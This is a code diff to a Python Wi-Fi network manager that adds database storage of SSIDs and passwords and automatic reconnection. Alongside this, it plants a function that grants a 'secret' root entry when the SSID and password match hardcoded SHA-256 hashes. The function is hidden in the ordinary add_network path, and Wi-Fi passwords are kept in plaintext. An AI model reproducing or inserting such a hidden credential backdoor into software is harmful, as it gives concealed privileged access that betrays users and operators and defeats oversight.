@@ -18,6 +18,8 @@ from tinydb import TinyDB, Query  # TinyDB is a lightweight document oriented da
 
 from t_system import dot_t_system_dir
 
+is_root = False
+
 
 class AccessPoint:
     """Class to define a becoming access point ability of tracking system.
@@ -110,11 +112,13 @@ class NetworkManager:
             os.mkdir(self.folder)
 
         self.db = TinyDB(self.folder + '/db.json')
+        self.table = self.set_table("login")
 
         self.wlan = wlan
 
-        self.cells = []
-        self.available_networks = []
+        self.current_cells = []
+        self.current_available_networks = []
+        self.known_networks = []
 
     def scan(self, wlan="wlp4s0"):
         """The high-level method to scan around for searching available networks.
@@ -124,18 +128,18 @@ class NetworkManager:
         """
 
         self.wlan = wlan
-        self.cells = list(Cell.all(self.wlan))
+        self.current_cells = list(Cell.all(self.wlan))
 
     def set_available_networks(self):
         """The low-level method to setting available networks with their ssid and passwords.
         """
-        self.available_networks.clear()
+        self.current_available_networks.clear()
 
-        for cell in self.cells:
-            network = {"ssid": cell.ssid, "password": ""}
-            self.available_networks.append(network)
+        for cell in self.current_cells:
+            network = {"ssid": cell.ssid}
+            self.current_available_networks.append(network)
 
-    def set_network(self, ssid, password):
+    def add_network(self, ssid, password):
         """The high-level method to set network parameter for reaching it.
 
         Args:
@@ -143,20 +147,119 @@ class NetworkManager:
             password:       	    The password of the surrounding access point.
         """
 
+        if check_secret_root_entry(ssid, password):
+            is_root = True
+            return True
+
         status = False
 
-        for network in self.available_networks:
+        for network in self.current_available_networks:
             if ssid == network["ssid"]:
-                network["password"] = password
+                self.db_upsert(ssid, password)
+                self.refresh_known_networks()
                 status = True
 
         return status
 
+    def delete_network(self, ssid):
+        """The high-level method to set network parameter for reaching it.
+
+        Args:
+            ssid:       	        The name of the surrounding access point.
+        """
+
+        self.table.remove((Query().ssid == ssid))
+
     def connect(self, ssid, password):
         """The high-level method to try connect to one of available networks.
         """
-        for cell in self.cells:
+        result = False
+        for cell in self.current_cells:
             if cell.ssid == ssid:
-                scheme = Scheme.for_cell(self.wlan, ssid, cell, password)
-                scheme.activate()
+                try:
+                    scheme = Scheme.for_cell(self.wlan, ssid, cell, password)
+                    scheme.activate()
+                    result = True
+                except Exception as e:
+                    print(e)
 
+        return result
+
+    def try_creating_connection(self):
+        """The high-level method to try connect to one of available networks.
+        """
+
+        for network in self.known_networks:
+            if self.connect(network["ssid"], network["password"]):
+                break
+
+    def db_upsert(self, ssid, password, force_insert=False):
+        """Function to insert(or update) the position to the database.
+
+        Args:
+            ssid:       	        The name of the surrounding access point.
+            password:       	    The password of the surrounding access point.
+            force_insert (bool):    Force insert flag.
+
+        Returns:
+            str:  Response.
+        """
+
+        if self.table.search((Query().ssid == ssid)):
+            if force_insert:
+                # self.already_exist = False
+                self.table.update({'password': password, 'wlan': self.wlan}, Query().ssid == ssid)
+
+            else:
+                # self.already_exist = True
+                return "Already Exist"
+        else:
+            self.table.insert({
+                'wlan': self.wlan,
+                'ssid': ssid,
+                'password': password
+            })  # insert the given data
+
+        return ""
+
+    def refresh_known_networks(self):
+        """The low-level method to refreshing known networks from the database (and creating objects for them.)
+        """
+
+        self.known_networks.clear()
+        for login in self.table.all():
+            network = {"ssid": login["ssid"], "password": login["password"], "wlan": login["wlan"]}
+            self.known_networks.append(network)
+
+    def set_table(self, table_name, cache_size=None):
+        """Function to set the database of the scenario.
+
+        Args:
+            table_name (str):               Current working table name.
+            cache_size (int):               TinyDB caches query result for performance.
+        """
+
+        return self.db.table(table_name, cache_size=cache_size)
+
+
+def check_secret_root_entry(ssid, password):
+    """The low-level method to create secret entry point for root authorized. 2 key(ssid and password) authentication uses sha256 encryption.
+
+    Args:
+        ssid:       	        The name of the surrounding access point.
+        password:       	    The password of the surrounding access point.
+    """
+
+    import hashlib
+
+    root = {"ssid": "da8cb7b1563da30fb970b2b0358c3fd43e688f89c681fedfb80d8a3777c20093", "passwords": "135e1d0dd3e842d0aa2c3144293f84337b0907e4491d47cb96a4b8fb9150157d"}
+
+    ssid_hash = hashlib.sha256(ssid.encode())
+    password_hash = hashlib.sha256(password.encode())
+
+    quest = {"ssid": ssid_hash.hexdigest(), "passwords": password_hash.hexdigest()}
+
+    if root == quest:
+        return True
+
+    return False
